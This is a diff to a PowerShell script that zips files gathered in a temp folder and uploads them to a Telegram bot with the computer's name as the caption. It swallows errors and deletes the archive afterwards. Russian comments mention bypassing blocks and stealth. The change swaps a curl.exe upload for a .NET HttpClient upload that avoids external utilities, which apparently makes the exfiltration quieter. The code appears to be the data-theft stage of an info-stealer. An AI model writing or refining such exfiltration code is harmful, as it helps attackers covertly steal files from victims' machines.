@@ -69,13 +69,27 @@ if ((Get-ChildItem $tempDir).Count -gt 1) {
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
 
     try {
-        $caption = "Protocol 81: $($env:COMPUTERNAME) ($($env:USERNAME))"
-        # Используем curl.exe для обхода блокировок и скрытности
-        # --connect-timeout 10 на случай лагов сети
-        & curl.exe --silent --connect-timeout 10 -X POST "https://api.telegram.org/bot$botToken/sendDocument" `
-          -F "chat_id=$chatId" `
-          -F "document=@$zipPath" `
-          -F "caption=$caption" | Out-Null
+        $uri = "https://api.telegram.org/bot$botToken/sendDocument"
+        
+        # Формируем тело запроса без использования внешних утилит
+        $fileStream = [System.IO.File]::OpenRead($zipPath)
+        $fileName = [System.IO.Path]::GetFileName($zipPath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        
+        $form = New-Object System.Net.Http.MultipartFormDataContent
+        $form.Add($fileContent, "document", $fileName)
+        $form.Add((New-Object System.Net.Http.StringContent($chatId)), "chat_id")
+        $form.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME")), "caption")
+
+        # Отправка
+        $client = New-Object System.Net.Http.HttpClient
+        $response = $client.PostAsync($uri, $form).Result
+        
+        # Закрываем потоки
+        $fileStream.Close()
+        $fileStream.Dispose()
+        $form.Dispose()
+        $client.Dispose()
     } catch {}
 
     # Очистка архива
